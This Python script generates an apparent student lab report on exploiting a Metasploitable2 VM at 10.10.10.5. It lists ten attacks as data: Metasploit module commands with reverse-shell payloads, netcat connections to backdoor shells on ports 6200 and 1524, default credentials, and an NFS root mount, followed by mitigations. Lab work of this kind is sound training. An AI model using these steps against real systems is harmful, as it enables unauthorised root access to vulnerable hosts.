#!/usr/bin/env python3
"""
generate_report.py

Generates Metasploitable.md from structured data below.
Review each field -- especially "why_tool" and "kill_chain_reasoning" --
and put things in your own words before final submission.

Run with:
    python3 generate_report.py
"""

# ---------------------------------------------------------------
# 1. HEADER DETAILS -- double check name/index number are correct
# ---------------------------------------------------------------
HEADER = {
    "name": "Spendylove Amankwaah",
    "index_number": "7351923",
    "date": "September 27, 2026",
    "target_ip": "10.10.10.5",
    "tools": "Kali Linux 2026.2, Metasploit Framework 6.4.135-dev, Nmap, Netcat",
}

RECON_SUMMARY = """\
Initial discovery was performed using `nmap -p- -sV -sC 10.10.10.5`. This
revealed multiple vulnerable services including FTP (vsftpd 2.3.4), SMB
(usermap_script), IRC (UnrealIRCd 3.2.8.1), distccd, Java RMI registry,
Apache Tomcat manager, NFS (unrestricted export), VNC (weak password),
PostgreSQL (default credentials), and an Ingreslock backdoor on port 1524.
"""

# ---------------------------------------------------------------
# 2. EXPLOITS -- in the order actually performed
# ---------------------------------------------------------------
EXPLOITS = [
    {
        "title": "vsftpd 2.3.4 Backdoor",
        "service_port": "FTP / 21 (backdoor shell on 6200)",
        "vulnerability": "CVE-2011-2523 (Smiley Face Backdoor)",
        "tool_used": "Manual trigger + `nc` to catch shell",
        "why_tool": (
            "Seamlessly sends the ':)' string and catches the resulting root shell."
        ),
        "steps": [
            "Triggered the backdoor via FTP login with ':)' in the username on port 21",
            "nc 10.10.10.5 6200",
            "id / hostname / uname -a",
        ],
        "evidence": "evidence/exploit1.png",
        "kill_chain": ["Delivery", "Exploitation", "C2"],
        "kill_chain_reasoning": (
            "Delivery: sent the malformed username string. "
            "Exploitation: the backdoor code path was triggered. "
            "C2: caught an interactive root shell on port 6200."
        ),
        "outcome": "Instant root shell (uid=0(root)).",
    },
    {
        "title": "Samba usermap_script",
        "service_port": "SMB / 139",
        "vulnerability": "CVE-2007-2447",
        "tool_used": "exploit/multi/samba/usermap_script",
        "why_tool": (
            "Automates shell metacharacter injection into the username field."
        ),
        "steps": [
            "use exploit/multi/samba/usermap_script",
            "set RHOSTS 10.10.10.5",
            "run",
        ],
        "evidence": "evidence/exploit2.png",
        "kill_chain": ["Delivery", "Exploitation", "C2"],
        "kill_chain_reasoning": (
            "Delivery: sent the malicious username to the SMB service. "
            "Exploitation: command injection was triggered. "
            "C2: command shell session opened as root."
        ),
        "outcome": "Root shell (uid=0(root)).",
    },
    {
        "title": "UnrealIRCd 3.2.8.1 Backdoor",
        "service_port": "IRC / 6667",
        "vulnerability": "Malicious source-code backdoor (2010)",
        "tool_used": "exploit/unix/irc/unreal_ircd_3281_backdoor",
        "why_tool": (
            "Triggers the specific debug string required by the backdoored software."
        ),
        "steps": [
            "use exploit/unix/irc/unreal_ircd_3281_backdoor",
            "set RHOSTS 10.10.10.5",
            "set LHOST 10.10.10.3",
            "run",
        ],
        "evidence": "evidence/exploit3.png",
        "kill_chain": ["Delivery", "Exploitation", "C2"],
        "kill_chain_reasoning": (
            "Delivery: sent the IRC backdoor trigger command. "
            "Exploitation: forced the service to execute the payload. "
            "C2: Meterpreter session opened as root."
        ),
        "outcome": "Meterpreter session as root.",
    },
    {
        "title": "DistCC Command Execution",
        "service_port": "distccd / 3632",
        "vulnerability": "CVE-2004-2687",
        "tool_used": "exploit/unix/misc/distcc_exec",
        "why_tool": (
            "Readily exploits the compilation daemon to run arbitrary commands."
        ),
        "steps": [
            "use exploit/unix/misc/distcc_exec",
            "set RHOSTS 10.10.10.5",
            "set PAYLOAD cmd/unix/reverse_perl",
            "set LHOST 10.10.10.3",
            "set LPORT 4444",
            "run",
        ],
        "evidence": "evidence/exploit4.png",
        "kill_chain": ["Exploitation", "C2"],
        "kill_chain_reasoning": (
            "Exploitation: sent an execution request straight to the daemon, "
            "which accepts and runs arbitrary commands with no prior delivery stage. "
            "C2: command shell session opened."
        ),
        "outcome": "Shell as daemon user (uid=1(daemon)).",
    },
    {
        "title": "Java RMI Server Insecure Default Configuration",
        "service_port": "Java RMI / 1099",
        "vulnerability": "Insecure default RMI registry configuration",
        "tool_used": "exploit/multi/misc/java_rmi_server",
        "why_tool": (
            "The RMI registry has no built-in authentication, so a dedicated "
            "module can deliver a payload class and have the server load and "
            "execute it directly, rather than needing a separate delivery mechanism."
        ),
        "steps": [
            "use exploit/multi/misc/java_rmi_server",
            "set RHOSTS 10.10.10.5",
            "set LHOST 10.10.10.3",
            "run",
        ],
        "evidence": "evidence/exploit5.png",
        "kill_chain": ["Delivery", "Exploitation", "C2"],
        "kill_chain_reasoning": (
            "Delivery: payload JAR sent via a crafted RMI call. "
            "Exploitation: the remote class was loaded and executed. "
            "C2: Meterpreter sessions opened as root."
        ),
        "outcome": "Meterpreter session as root.",
    },
    {
        "title": "Tomcat Manager Default Credentials",
        "service_port": "Apache Tomcat / 8180",
        "vulnerability": "Default credentials (tomcat:tomcat)",
        "tool_used": "exploit/multi/http/tomcat_mgr_upload",
        "why_tool": (
            "Automatically packages a payload into a WAR file and deploys it via the manager."
        ),
        "steps": [
            "use exploit/multi/http/tomcat_mgr_upload",
            "set RHOSTS 10.10.10.5",
            "set RPORT 8180",
            "set HttpUsername tomcat",
            "set HttpPassword tomcat",
            "run",
        ],
        "evidence": "evidence/exploit6.png",
        "kill_chain": ["Delivery", "Exploitation", "C2"],
        "kill_chain_reasoning": (
            "Delivery: WAR file uploaded via the manager interface. "
            "Exploitation: the deployed application triggered code execution. "
            "C2: Meterpreter session opened."
        ),
        "outcome": "Meterpreter session as tomcat55.",
    },
    {
        "title": "NFS Unrestricted Share",
        "service_port": "NFS / 2049",
        "vulnerability": "Misconfigured export (/ *)",
        "tool_used": "showmount and mount",
        "why_tool": (
            "Native OS tools allow direct mounting of the exposed filesystem."
        ),
        "steps": [
            "showmount -e 10.10.10.5",
            "mkdir /tmp/mnt",
            "sudo mount -t nfs 10.10.10.5:/ /tmp/mnt",
            "ls -la /tmp/mnt",
        ],
        "evidence": "evidence/exploit7.png",
        "kill_chain": ["Recon", "Actions on Objectives"],
        "kill_chain_reasoning": (
            "Reconnaissance: identified the exposed '/ *' export. "
            "Actions on Objectives: gained full read access to the target's "
            "root filesystem without needing code execution."
        ),
        "outcome": "Full read access to the target's entire filesystem.",
    },
    {
        "title": "VNC Weak Password",
        "service_port": "VNC / 5900",
        "vulnerability": "Weak default credentials",
        "tool_used": "auxiliary/scanner/vnc/vnc_login",
        "why_tool": (
            "Metasploit quickly automates VNC login checks."
        ),
        "steps": [
            "use auxiliary/scanner/vnc/vnc_login",
            "set RHOSTS 10.10.10.5",
            "run",
        ],
        "evidence": "evidence/exploit8.png",
        "kill_chain": ["Weaponization", "Exploitation"],
        "kill_chain_reasoning": (
            "Weaponization: configured the scanner to sweep for known/weak "
            "credentials. Exploitation: successfully authenticated using the "
            "discovered password."
        ),
        "outcome": "Valid VNC credentials found (password: 'password').",
    },
    {
        "title": "PostgreSQL Default Credentials",
        "service_port": "PostgreSQL / 5432",
        "vulnerability": "Default credentials (postgres:postgres)",
        "tool_used": "exploit/linux/postgres/postgres_payload",
        "why_tool": (
            "Uploads a shared object to execute OS commands via database queries."
        ),
        "steps": [
            "use exploit/linux/postgres/postgres_payload",
            "set RHOSTS 10.10.10.5",
            "set LHOST 10.10.10.3",
            "set USERNAME postgres",
            "set PASSWORD postgres",
            "run",
        ],
        "evidence": "evidence/exploit9.png",
        "kill_chain": ["Delivery", "Exploitation", "C2"],
        "kill_chain_reasoning": (
            "Delivery: shared object uploaded to /tmp on the target. "
            "Exploitation: executed via a SQL function call. "
            "C2: Meterpreter session opened as postgres."
        ),
        "outcome": "Meterpreter session as postgres user.",
    },
    {
        "title": "Ingreslock Bind Shell",
        "service_port": "Ingreslock / 1524",
        "vulnerability": "Pre-existing root bind shell (open backdoor)",
        "tool_used": "nc (Netcat)",
        "why_tool": (
            "Directly interacts with the raw TCP socket."
        ),
        "steps": [
            "nc 10.10.10.5 1524",
            "whoami / id / hostname",
        ],
        "evidence": "evidence/exploit10.png",
        "kill_chain": ["Delivery", "C2"],
        "kill_chain_reasoning": (
            "Delivery: initiated a direct TCP connection to the listener. "
            "C2: interacted with the pre-existing root shell bound to the port."
        ),
        "outcome": "Instant root shell (uid=0(root)).",
    },
]

ALL_STAGES = [
    "Recon", "Weaponization", "Delivery", "Exploitation",
    "Installation", "C2", "Actions on Objectives",
]

LESSONS_LEARNED = """\
- Disable default/anonymous accounts and default credentials on FTP, VNC,
  Tomcat, and PostgreSQL.
- Patch or remove services with known backdoors (vsftpd 2.3.4, UnrealIRCd
  3.2.8.1) -- verify package integrity/checksums since these were
  supply-chain style backdoors, not simple bugs.
- Restrict NFS shares to specific IP ranges rather than exporting '/ *'
  to any host.
- Disable unnecessary legacy services entirely (distccd, Ingreslock/1524)
  where they serve no production purpose.
"""

# =================================================================
# Rendering logic -- no need to edit below this line
# =================================================================

def stage_map(exploit_stages):
    return ["✔" if stage in exploit_stages else "" for stage in ALL_STAGES]


def render_exploit(i, e):
    steps_md = "\n".join(f"  {n}. {s}" for n, s in enumerate(e["steps"], 1))
    stages_line = ", ".join(e["kill_chain"])
    return f"""## Exploit {i}: {e['title']}

- **Service / Port:** {e['service_port']}
- **Vulnerability:** {e['vulnerability']}
- **Tool Used:** {e['tool_used']}
- **Why This Tool:** {e['why_tool']}
- **Steps:**
{steps_md}
- **Evidence:** {e['evidence']}
- **Cyber Kill Chain Stage(s):** {stages_line}
  - {e['kill_chain_reasoning']}
- **Outcome / Impact:** {e['outcome']}

---
"""


def render_table():
    header = "| Exploit | " + " | ".join(ALL_STAGES) + " |"
    sep = "|---|" + "---|" * len(ALL_STAGES)
    rows = [header, sep]
    for i, e in enumerate(EXPLOITS, 1):
        flags = stage_map(e["kill_chain"])
        rows.append(f"| {i}. {e['title']} | " + " | ".join(flags) + " |")
    return "\n".join(rows)


def render_report():
    exploit_sections = "\n".join(
        render_exploit(i, e) for i, e in enumerate(EXPLOITS, 1)
    )
    return f"""# Metasploitable2 Exploitation Report

**Name:** {HEADER['name']}
**Index Number:** {HEADER['index_number']}
**Date:** {HEADER['date']}
**Target IP:** {HEADER['target_ip']}
**Attacker OS / Tools:** {HEADER['tools']}

---

## Reconnaissance Summary

{RECON_SUMMARY}
---

{exploit_sections}

## Kill Chain Coverage Summary

{render_table()}

---

## Lessons Learned / Mitigations

{LESSONS_LEARNED}
"""


if __name__ == "__main__":
    report = render_report()
    with open("Metasploitable.md", "w") as f:
        f.write(report)
    print(f"Wrote Metasploitable.md with {len(EXPLOITS)} exploit(s) documented.")
